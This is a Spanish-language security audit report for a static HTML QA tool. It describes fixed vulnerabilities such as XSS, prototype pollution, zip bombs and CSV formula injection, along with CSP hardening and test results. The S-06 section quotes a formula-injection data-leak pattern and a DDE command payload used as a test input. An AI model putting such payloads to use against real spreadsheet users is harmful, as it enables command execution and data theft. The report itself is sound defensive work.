# Informe de auditoría de seguridad y QA

**Producto:** QA Visual Check 1.0 (archivo único `dist/QA-Visual-Check.html`)
**Alcance:** revisión de código, endurecimiento y pruebas automatizadas previas a publicar el
proyecto en GitHub y, más adelante, en un dominio propio.
**Modelo de amenaza:** aplicación estática sin servidor ni sesión de usuario. El atacante no
controla la infraestructura; controla **los archivos que se abren con la herramienta**
(un `.json` de sesión, un Excel, un PDF, una imagen) y, si la herramienta se publica en la web,
puede intentar incrustarla o inducir a la víctima a cargar contenido preparado.

---

## 1. Resultado

| Suite | Verificaciones | Estado |
|---|---|---|
| Funcional (`tests/run-tests.js`) | 52 | 52 OK |
| Seguridad (`tests/run-security-tests.js`) | 48 | 48 OK |

Sin peticiones de red salientes en ninguna prueba. Sin errores de JavaScript no controlados.

## 2. Hallazgos corregidos

### S-01 · XSS almacenado a través de un archivo de sesión — **Alta**
Una sesión `.json` se fusionaba con el estado (`Object.assign`, *spread*) y sus valores llegaban
al generador del reporte. Un archivo preparado podía inyectar marcado en el reporte y, con
`src` manipulado, un manejador `onerror`.
**Corrección:** `sanitizeSession()` reconstruye la sesión campo por campo (tipos, rangos, listas
de valores permitidos, identificadores nuevos) y el reporte escapa todo texto, fuerza los números
y revalida las imágenes.

### S-02 · Contaminación de prototipos — **Alta**
`Object.assign(S.meta, data.meta)` sobre datos del archivo permitía que una clave `__proto__`
alterara `Object.prototype` y con ello el comportamiento de toda la aplicación.
**Corrección:** ningún objeto del archivo se copia tal cual; las claves reservadas se descartan
también en las columnas extra de Excel.

### S-03 · Imágenes con esquema arbitrario — **Media**
Los campos de imagen aceptaban cualquier cadena, incluidas `javascript:` y `data:text/html`.
**Corrección:** lista blanca `data:image/(png|jpeg|jpg|webp|gif|bmp);base64,…` con tope de tamaño,
aplicada tanto al cargar como al generar el reporte.

### S-04 · SVG con script dentro de la sesión — **Media**
Un SVG se guardaba tal cual y viajaba dentro del `.json` y del reporte. Aunque en `<img>` no se
ejecuta, transportar marcado ajeno es innecesario.
**Corrección:** todo SVG se rasteriza a PNG al entrar.

### S-05 · Agotamiento de memoria con `.xlsx` — **Media**
El descompresor no tenía tope: un archivo de 115 KB podía expandirse a cientos de MB
(«zip bomb»), incluso declarando un tamaño falso en la cabecera.
**Corrección:** lectura por trozos con tope por entrada y total, validación del tamaño declarado
y límites de filas, columnas y longitud de celda. Verificado con dos bombas distintas: la
aplicación sigue respondiendo y la memoria no pasa de ~125 MB.

### S-06 · Inyección de fórmulas al exportar a CSV — **Media**
Una celda que empieza por `=`, `+`, `-` o `@` se ejecuta al abrir el CSV en Excel o Sheets;
`=HYPERLINK("http://…"&A1)` es una fuga de datos clásica en herramientas de QA.
**Corrección:** prefijo de apóstrofo en la exportación. (El `.xlsx` que genera la herramienta usa
cadenas en línea, que Excel nunca evalúa como fórmula.) Verificado de extremo a extremo: la suite
crea un hallazgo titulado `=cmd|' /C calc'!A0`, descarga el CSV y comprueba sobre el archivo real
que ninguna celda empieza por `=`, `+`, `-` o `@`.

### S-07 · Avisos que interpretaban marcado — **Baja**
Los avisos emergentes insertaban HTML; dependían de que cada punto de llamada recordara escapar
el texto. Un nombre de archivo con marcado podía inyectar en ese hueco.
**Corrección:** los avisos tratan el mensaje como texto por defecto; el marcado fijo de la propia
aplicación usa una función aparte.

### S-08 · Imágenes desmesuradas — **Baja**
Una imagen de decenas de miles de píxeles por lado bloqueaba la pestaña al rasterizarla.
**Corrección:** límites de lado y de superficie, con aviso claro, y recorte del lienzo al
renderizar páginas de PDF.

### S-09 · Ausencia de aislamiento en la vista previa del reporte — **Baja**
La vista previa se cargaba en un `iframe` sin restricciones.
**Corrección:** `sandbox` sin permisos (el reporte no necesita scripts) y `noopener,noreferrer`
al abrirlo en pestaña nueva.

## 3. Endurecimiento añadido

* **CSP estricta incrustada** en el HTML: sin red, sin recursos externos, sin `eval`.
  El plan B del lector de PDF dejó de usar `new Function` para no necesitar `'unsafe-eval'`.
* **`script-src` por hash SHA-256, sin `'unsafe-inline'`.** `build.py` calcula el hash de cada
  script incrustado y genera con ellos la política, que propaga al `<meta>` y a los cuatro
  archivos de hosting: la CSP se define en un solo lugar y no puede quedar desincronizada.
  Efecto medible: un `<script>` inyectado en el DOM y un atributo `onclick` inyectado **no se
  ejecutan**; ambos casos están en la suite. En securityheaders.com esto sube la nota de A a A+.
* **`Permissions-Policy`, `frame-ancestors`, HSTS y `Referrer-Policy`** preparados en `hosting/`
  para cuando el proyecto se publique en un dominio.
* **Borrado de datos locales** desde la interfaz, para equipos compartidos.
* **Una sola clave de `localStorage`**, sin imágenes de alta resolución.

## 4. Defectos funcionales corregidos durante las pruebas

| | Defecto | Efecto |
|---|---|---|
| F-01 | El atributo `hidden` no ocultaba modales ni overlays (`display:flex` ganaba por especificidad) | Una capa invisible interceptaba todos los clics |
| F-02 | El encuadre inicial se calculaba con el lienzo aún oculto | La comparación abría con zoom del 2 % |
| F-03 | La auto-alineación premiaba escalas erróneas: al estirar la imagen los bordes se difuminan y bajaba el error absoluto | Elegía 103 % y aumentaba la diferencia reportada |
| F-04 | Condición de carrera al cargar diseños y capturas a la vez | Emparejamiento incompleto |
| F-05 | Con Safari los *workers* desde `file://` pueden bloquearse | El PDF no abría; ahora hay respaldo en el hilo principal |
| F-06 | Al quitar `new Function` del respaldo anterior, el código del worker pasó al ámbito global y chocó con pdf.js (`Identifier 'InvalidPDFException' has already been declared`) | El respaldo quedó roto sin que ninguna prueba lo notara; ahora va envuelto en una función y el caso «sin Worker» es parte de la suite funcional |

## 5. Riesgos aceptados (documentados, no corregibles en el producto)

* **El reporte y la sesión contienen capturas de la aplicación revisada.** Quien los reciba ve
  esas imágenes. Es el propósito del entregable; el cuidado es de proceso, no técnico.
* **`localStorage` es del navegador.** En un equipo compartido con la misma cuenta de sistema,
  otra persona puede abrir la herramienta y ver el último trabajo si no se borró.
* **La herramienta no valida quién la usa.** No hay autenticación porque no hay datos del lado
  del servidor; si se publica en un dominio, cualquiera puede usar la herramienta — con sus
  propios archivos, nunca con los tuyos.

## 6. Cómo reproducir las pruebas

```bash
npm install
npm run build
npm run fixtures
npm test
npm run test:security
```

Las pruebas levantan Chromium real, cargan la herramienta desde `file://`, y verifican
comportamiento observable: qué elementos existen en el DOM, qué peticiones de red obtuvieron
respuesta y si algún payload llegó a ejecutarse.
